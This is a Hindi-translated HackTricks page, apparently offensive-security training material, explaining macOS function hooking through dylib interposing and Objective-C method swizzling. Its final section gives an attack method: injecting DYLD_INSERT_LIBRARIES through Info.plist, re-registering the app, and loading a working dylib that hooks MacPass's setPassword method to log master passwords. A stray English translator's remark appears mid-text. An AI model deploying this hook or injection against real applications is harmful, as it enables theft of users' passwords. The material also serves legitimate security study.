# macOS फंक्शन हुकिंग

<details>

<summary><strong> AWS हैकिंग सीखें शून्य से लेकर हीरो तक </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## फंक्शन इंटरपोजिंग

एक **dylib** बनाएं जिसमें **`__interpose`** सेक्शन हो (या एक सेक्शन जिसे **`S_INTERPOSING`** के साथ फ्लैग किया गया हो) जिसमें **फंक्शन पॉइंटर्स** के जोड़े हों जो **मूल** और **प्रतिस्थापन** फंक्शन्स को संदर्भित करते हों।

फिर, **`DYLD_INSERT_LIBRARIES`** के साथ dylib को **इंजेक्ट** करें (इंटरपोजिंग को मुख्य ऐप लोड होने से पहले होना चाहिए)। स्पष्ट है कि [**`DYLD_INSERT_LIBRARIES`** के उपयोग पर लागू होने वाली **प्रतिबंध** यहां भी लागू होती है](../macos-proces-abuse/macos-library-injection/#check-restrictions)।

### printf को इंटरपोज करें

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c का अनुवाद" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
The provided text appears to be closing syntax for a tabbed section in a markdown file, typically used in documentation or book writing to separate content into tabs. Since there is no actual content to translate, only the markdown syntax is present, which should not be translated as per your instructions. Therefore, there is nothing to translate in this case. The text remains the same:

```
{% endtab %}
{% endtabs %}
```
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## मेथड स्विजलिंग

ObjectiveC में एक मेथड को इस प्रकार कॉल किया जाता है: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

इसके लिए **ऑब्जेक्ट**, **मेथड** और **पैराम्स** की आवश्यकता होती है। और जब कोई मेथड कॉल किया जाता है तो एक **संदेश भेजा जाता है** जिसके लिए **`objc_msgSend`** फंक्शन का उपयोग होता है: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

ऑब्जेक्ट है **`someObject`**, मेथड है **`@selector(method1p1:p2:)`** और आर्ग्यूमेंट्स हैं **value1**, **value2**.

ऑब्जेक्ट स्ट्रक्चर्स का अनुसरण करते हुए, **मेथड्स की एक ऐरे** तक पहुँचा जा सकता है जहाँ **नाम** और मेथड कोड के लिए **पॉइंटर्स** **स्थित** होते हैं।

{% hint style="danger" %}
ध्यान दें कि चूंकि मेथड्स और क्लासेस उनके नामों के आधार पर एक्सेस किए जाते हैं, यह जानकारी बाइनरी में स्टोर की जाती है, इसलिए इसे `otool -ov </path/bin>` या [`class-dump </path/bin>`](https://github.com/nygard/class-dump) के साथ पुनः प्राप्त किया जा सकता है।
{% endhint %}

### रॉ मेथड्स तक पहुँच

मेथड्स की जानकारी जैसे नाम, पैराम्स की संख्या या पता निम्नलिखित उदाहरण की तरह एक्सेस की जा सकती है:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### मेथड स्विजलिंग के साथ method\_exchangeImplementations

फंक्शन **`method_exchangeImplementations`** एक फंक्शन के **कार्यान्वयन** के **पते** को **दूसरे के साथ बदलने** की अनुमति देता है।

{% hint style="danger" %}
इसलिए जब एक फंक्शन को कॉल किया जाता है तो जो **निष्पादित होता है वह दूसरा होता है**।
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
इस मामले में यदि **लेजिट** मेथड का **कार्यान्वयन कोड** मेथड **नाम** की **जांच** करता है, तो यह स्विजलिंग का **पता** लगा सकता है और इसे चलने से रोक सकता है।

निम्नलिखित तकनीक में यह प्रतिबंध नहीं है।
{% endhint %}

### Method Swizzling with method_setImplementation

पिछला प्रारूप अजीब है क्योंकि आप दो मेथड्स का कार्यान्वयन एक दूसरे से बदल रहे हैं। **`method_setImplementation`** फंक्शन का उपयोग करके आप एक मेथड का **कार्यान्वयन** दूसरे के लिए **बदल** सकते हैं।

बस याद रखें कि यदि आप नए कार्यान्वयन से मूल कार्यान्वयन को कॉल करने जा रहे हैं तो उसके पते को **संग्रहित करें** इसे ओवरराइट करने से पहले क्योंकि बाद में उस पते को लोकेट करना ज्यादा जटिल हो जाएगा।
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## हुकिंग अटैक मेथडोलॉजी

इस पृष्ठ पर फंक्शन्स को हुक करने के विभिन्न तरीकों पर चर्चा की गई थी। हालांकि, इसमें **प्रक्रिया के अंदर कोड चलाना शामिल था**।

ऐसा करने के लिए सबसे आसान तकनीक [Dyld को पर्यावरण चर के माध्यम से या हाइजैकिंग के जरिए इंजेक्ट करना](../macos-dyld-hijacking-and-dyld_insert_libraries.md) है। हालांकि, मुझे लगता है कि यह [Dylib प्रोसेस इंजेक्शन](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) के माध्यम से भी किया जा सकता है।

लेकिन, दोनों विकल्प **सीमित** हैं **असुरक्षित** बाइनरीज/प्रोसेसेज के लिए। प्रत्येक तकनीक की जांच करें ताकि आप सीमाओं के बारे में और जान सकें।

हालांकि, एक फंक्शन हुकिंग अटैक बहुत विशिष्ट होता है, एक हमलावर इसे **प्रक्रिया के अंदर से संवेदनशील जानकारी चुराने के लिए करेगा** (अगर नहीं तो आप सिर्फ एक प्रोसेस इंजेक्शन अटैक करेंगे)। और यह संवेदनशील जानकारी MacPass जैसे उपयोगकर्ता द्वारा डाउनलोड किए गए ऐप्स में स्थित हो सकती है।

इसलिए हमलावर का वेक्टर या तो किसी भेद्यता को ढूंढना होगा या एप्लिकेशन के हस्ताक्षर को हटाना होगा, एप्लिकेशन के Info.plist के माध्यम से **`DYLD_INSERT_LIBRARIES`** env चर को इंजेक्ट करना होगा, जैसे कुछ जोड़ना:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
और फिर एप्लिकेशन को **पुनः पंजीकृत** करें:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

उस लाइब्रेरी में हुकिंग कोड जोड़ें ताकि सूचना को बाहर निकाला जा सके: पासवर्ड, संदेश...

{% hint style="danger" %}
ध्यान दें कि macOS के नए संस्करणों में यदि आप एप्लिकेशन बाइनरी का **सिग्नेचर हटा देते हैं** और यह पहले चलाया जा चुका है, तो macOS **अब एप्लिकेशन को चलाना बंद कर देगा**।
{% endhint %}

#### लाइब्रेरी उदाहरण
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## संदर्भ

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>
